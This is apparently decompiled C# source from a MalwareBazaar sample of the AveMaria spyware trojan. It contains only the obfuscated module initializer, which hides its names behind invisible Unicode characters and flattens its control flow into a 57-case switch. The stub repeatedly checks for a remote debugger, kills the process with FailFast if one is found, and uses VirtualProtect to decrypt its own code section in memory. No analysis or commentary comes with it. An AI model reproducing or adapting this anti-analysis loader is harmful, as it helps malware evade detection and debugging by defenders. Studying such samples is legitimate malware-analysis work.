// Decompiled with JetBrains decompiler
// Type: <Module>
// Assembly: RegistryValueOpti, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 816AE86D-085C-4F3F-92FF-E9F04033D2FC
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Spy.MSIL.AveMaria.gen-ab03bc379e4e42422d0cb1d50d9c8ddfc051c886da8f8b135be802c962c1189e.exe

using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;

internal class \u003CModule\u003E
{
  static \u003CModule\u003E() => \u003CModule\u003E.\u206B​‫⁫⁭⁮‫‍⁭⁭⁮‬⁬⁬⁭‭​⁭⁫⁭‮⁭⁮⁪‪‬‫​‫⁭‎‮⁭‬‭⁯⁭‬‍‪‮();

  [DllImport("kernel32.dll", EntryPoint = "VirtualProtect")]
  internal static extern bool \u206B‬⁯‪⁪‌⁪​‎‪‌‪‬‏‬‫‫‏‍‫‌⁭‌⁯⁭‭⁫⁯‮​⁭‌‏‌‬‏‍‭⁬‬‮(
    [In] IntPtr obj0,
    [In] uint obj1,
    [In] uint obj2,
    [In] ref uint obj3);

  [DllImport("kernel32.dll", EntryPoint = "CheckRemoteDebuggerPresent", SetLastError = true)]
  internal static extern bool \u202C‭‬‬‮⁬‎⁪‌​‏‪‎⁫‬⁭​‍⁫⁭⁫⁫⁬‭‌‌‌‌‏‎‎‭‪‪‮‌‫‎⁪‫‮(
    [In] IntPtr obj0,
    [In] ref bool obj1);

  internal static unsafe void \u206B​‫⁫⁭⁮‫‍⁭⁭⁮‬⁬⁬⁭‭​⁭⁫⁭‮⁭⁮⁪‪‬‫​‫⁭‎‮⁭‬‭⁯⁭‬‍‪‮()
  {
    Module module = typeof (\u003CModule\u003E).Module;
    string fullyQualifiedName = module.FullyQualifiedName;
    bool flag1 = fullyQualifiedName.Length > 0 && fullyQualifiedName[0] == '<';
    byte* hinstance = (byte*) (void*) Marshal.GetHINSTANCE(module);
    byte* numPtr1 = hinstance + *(uint*) (hinstance + 60);
    ushort num1 = *(ushort*) (numPtr1 + 6);
    ushort num2 = *(ushort*) (numPtr1 + 20);
    bool flag2 = false;
    uint* numPtr2 = (uint*) null;
    uint num3 = 0;
    uint* numPtr3 = (uint*) (numPtr1 + 24 + (int) num2);
    uint num4 = 282118610;
label_1:
    int num5 = -518474008;
    while (true)
    {
      uint num6;
      uint num7;
      uint num8;
      uint num9;
      uint num10;
      uint num11;
      int index;
      uint[] numArray1;
      uint[] numArray2;
      int num12;
      uint num13;
      uint num14;
      uint num15;
      uint num16;
      uint* numPtr4;
      int num17;
      switch ((num6 = (uint) (num5 ^ -801639079)) % 57U)
      {
        case 0:
          numArray1[13] = numArray1[13] * numArray2[13];
          num5 = (int) num6 * -856451991 ^ 821070359;
          continue;
        case 1:
          \u003CModule\u003E.\u206B‬⁯‪⁪‌⁪​‎‪‌‪‬‏‬‫‫‏‍‫‌⁭‌⁯⁭‭⁫⁯‮​⁭‌‏‌‬‏‍‭⁬‬‮((IntPtr) (void*) numPtr2, num3 << 2, num15, ref num15);
          num5 = (int) num6 * 1106550245 ^ 1878961451;
          continue;
        case 2:
          numPtr4 = (uint*) (hinstance + (flag1 ? numPtr3[3] : numPtr3[1]));
          num5 = -89261990;
          continue;
        case 3:
          num15 = 64U;
          num5 = (int) num6 * 2033964590 ^ 1900037021;
          continue;
        case 4:
          goto label_3;
        case 5:
          numArray1[index] = num10;
          numArray2[index] = num8;
          num5 = -698168041;
          continue;
        case 6:
          numArray1[5] = numArray1[5] + numArray2[5];
          num5 = (int) num6 * -314720864 ^ -389891378;
          continue;
        case 7:
          num13 = 0U;
          num5 = (int) num6 * -1518116010 ^ 1701963191;
          continue;
        case 8:
          numArray1[9] = numArray1[9] ^ numArray2[9];
          numArray1[10] = numArray1[10] * numArray2[10];
          numArray1[11] = numArray1[11] + numArray2[11];
          num5 = (int) num6 * 1039605934 ^ 1962388330;
          continue;
        case 9:
          num17 = (int) *numPtr3;
          break;
        case 10:
          numArray1[12] = numArray1[12] ^ numArray2[12];
          num5 = (int) num6 * 1706291183 ^ -1382745069;
          continue;
        case 11:
          numArray1[(int) num11 & 15] = (uint) (((int) numArray1[(int) num11 & 15] ^ (int) *numPtr2++) + 1035675673);
          num5 = (int) num6 * 291470815 ^ -246655532;
          continue;
        case 12:
          int num18;
          num5 = num18 = num7 == 0U ? -721662867 : (num18 = -502127906);
          continue;
        case 13:
          \u003CModule\u003E.\u202C‭‬‬‮⁬‎⁪‌​‏‪‎⁫‬⁭​‍⁫⁭⁫⁫⁬‭‌‌‌‌‏‎‎‭‪‪‮‌‫‎⁪‫‮(Process.GetCurrentProcess().Handle, ref flag2);
          num5 = (int) num6 * 1521569009 ^ -2121553123;
          continue;
        case 14:
          int num19;
          num5 = num19 = index < 16 ? -1177262305 : (num19 = -784355721);
          continue;
        case 15:
          num16 = 0U;
          num5 = (int) num6 * 675206009 ^ 1687005679;
          continue;
        case 16:
          Environment.FailFast((string) null);
          num5 = (int) num6 * 1760681611 ^ 214765913;
          continue;
        case 17:
          \u003CModule\u003E.\u202C‭‬‬‮⁬‎⁪‌​‏‪‎⁫‬⁭​‍⁫⁭⁫⁫⁬‭‌‌‌‌‏‎‎‭‪‪‮‌‫‎⁪‫‮(Process.GetCurrentProcess().Handle, ref flag2);
          num5 = (int) num6 * -202796377 ^ 769456996;
          continue;
        case 18:
          num5 = (int) num6 * 415154407 ^ 1006989972;
          continue;
        case 19:
          num9 = num10 >> 7 | num10 << 25;
          num10 = num4 >> 11 | num4 << 21;
          num5 = -397794412;
          continue;
        case 20:
          int num20 = !flag2 ? 150128250 : (num20 = 192473484);
          num5 = num20 ^ (int) num6 * 977492548;
          continue;
        case 21:
          num12 = 0;
          num5 = -1452504130;
          continue;
        case 22:
          goto label_29;
        case 23:
          uint* numPtr5 = numPtr2;
          int num21 = (int) *numPtr5 ^ (int) numArray1[(int) num11 & 15];
          *numPtr5 = (uint) num21;
          num5 = -201553019;
          continue;
        case 24:
          numPtr3 += 8;
          num5 = -1496222062;
          continue;
        case 25:
          int num22;
          num5 = num22 = num16 >= num3 ? -244194068 : (num22 = -642221306);
          continue;
        case 26:
          num5 = (int) num6 * -1572857810 ^ -883960307;
          continue;
        case 27:
          uint* numPtr6 = numPtr3;
          uint* numPtr7 = (uint*) ((IntPtr) numPtr6 + 4);
          int num23 = (int) *numPtr6;
          uint* numPtr8 = numPtr7;
          numPtr3 = (uint*) ((IntPtr) numPtr8 + 4);
          int num24 = (int) *numPtr8;
          num7 = (uint) (num23 * num24);
          num5 = -596114792;
          continue;
        case 28:
          num8 = 2097681394U;
          num9 = 3128287498U;
          num10 = 2274490549U;
          num5 = (int) num6 * -1681001421 ^ -193701080;
          continue;
        case 29:
          num5 = (int) num6 * -1875121749 ^ 458831079;
          continue;
        case 30:
          int num25 = ((int) num4 ^ (int) *numPtr4++) + (int) num8 + (int) num9 * (int) num10;
          num4 = num8;
          num8 = num10;
          num10 = (uint) num25;
          ++num13;
          num5 = -480136211;
          continue;
        case 31:
          numArray1[6] = numArray1[6] ^ numArray2[6];
          numArray1[7] = numArray1[7] * numArray2[7];
          num5 = (int) num6 * 1650934251 ^ 1726764391;
          continue;
        case 32:
          if (!flag1)
          {
            num5 = -82681430;
            continue;
          }
          num17 = (int) numPtr3[2];
          break;
        case 33:
          int num26 = flag2 ? -1212906642 : (num26 = -548607622);
          num5 = num26 ^ (int) num6 * -289384835;
          continue;
        case 34:
          numArray1 = new uint[16];
          numArray2 = new uint[16];
          index = 0;
          num5 = (int) num6 * -611191740 ^ 251097998;
          continue;
        case 35:
          Environment.FailFast((string) null);
          num5 = (int) num6 * 1635109209 ^ -443209613;
          continue;
        case 36:
          ++num11;
          num5 = -248283719;
          continue;
        case 37:
          numArray1[8] = numArray1[8] + numArray2[8];
          num5 = (int) num6 * 1516228444 ^ -785937763;
          continue;
        case 38:
          numArray1[0] = numArray1[0] ^ numArray2[0];
          num5 = (int) num6 * 335905212 ^ -1751202549;
          continue;
        case 39:
          int num27;
          num5 = num27 = num13 < num14 ? -100887584 : (num27 = -721662867);
          continue;
        case 40:
          goto label_1;
        case 41:
          numArray1[14] = numArray1[14] + numArray2[14];
          numArray1[15] = numArray1[15] ^ numArray2[15];
          num5 = (int) num6 * 924521083 ^ -1068706014;
          continue;
        case 42:
          num4 = num8 >> 5 | num8 << 27;
          num8 = num9 >> 3 | num9 << 29;
          \u003CModule\u003E.\u202C‭‬‬‮⁬‎⁪‌​‏‪‎⁫‬⁭​‍⁫⁭⁫⁫⁬‭‌‌‌‌‏‎‎‭‪‪‮‌‫‎⁪‫‮(Process.GetCurrentProcess().Handle, ref flag2);
          num5 = (int) num6 * 2139687191 ^ -1268867182;
          continue;
        case 43:
          int num28 = num15 == 64U ? -914300503 : (num28 = -1312472615);
          num5 = num28 ^ (int) num6 * -1583147353;
          continue;
        case 44:
          num14 = numPtr3[2] >> 2;
          num5 = (int) num6 * -64432333 ^ 864388935;
          continue;
        case 45:
          int num29 = num7 == 3305424314U ? -1323128773 : (num29 = -234266759);
          num5 = num29 ^ (int) num6 * 4582103;
          continue;
        case 46:
          ++num16;
          num5 = (int) num6 * 927930058 ^ 1468243202;
          continue;
        case 47:
          \u003CModule\u003E.\u202C‭‬‬‮⁬‎⁪‌​‏‪‎⁫‬⁭​‍⁫⁭⁫⁫⁬‭‌‌‌‌‏‎‎‭‪‪‮‌‫‎⁪‫‮(Process.GetCurrentProcess().Handle, ref flag2);
          int num30 = flag2 ? 5492692 : (num30 = 360041765);
          num5 = num30 ^ (int) num6 * -268776642;
          continue;
        case 48:
          int num31 = flag2 ? -493067120 : (num31 = -830358126);
          num5 = num31 ^ (int) num6 * -1058778915;
          continue;
        case 49:
          numArray1[1] = numArray1[1] * numArray2[1];
          numArray1[2] = numArray1[2] + numArray2[2];
          numArray1[3] = numArray1[3] ^ numArray2[3];
          numArray1[4] = numArray1[4] * numArray2[4];
          num5 = (int) num6 * -2078376530 ^ 2048093092;
          continue;
        case 50:
          Environment.FailFast((string) null);
          num5 = (int) num6 * -106987297 ^ -731893258;
          continue;
        case 51:
          ++index;
          num5 = (int) num6 * -621501174 ^ 1164683704;
          continue;
        case 52:
          ++num12;
          num5 = (int) num6 * -1221395629 ^ -339517346;
          continue;
        case 53:
          int num32;
          num5 = num32 = num12 < (int) num1 ? -2076235430 : (num32 = -1559204956);
          continue;
        case 54:
          num11 = 0U;
          num5 = -504700616;
          continue;
        case 55:
          Environment.FailFast((string) null);
          num5 = (int) num6 * -1854017127 ^ 799778007;
          continue;
        case 56:
          numPtr2 = (uint*) (hinstance + (flag1 ? numPtr3[3] : numPtr3[1]));
          num5 = -92487767;
          continue;
        default:
          goto label_62;
      }
      num3 = (uint) num17 >> 2;
      num5 = -1148563386;
    }
label_3:
    return;
label_29:
    return;
label_62:;
  }
}
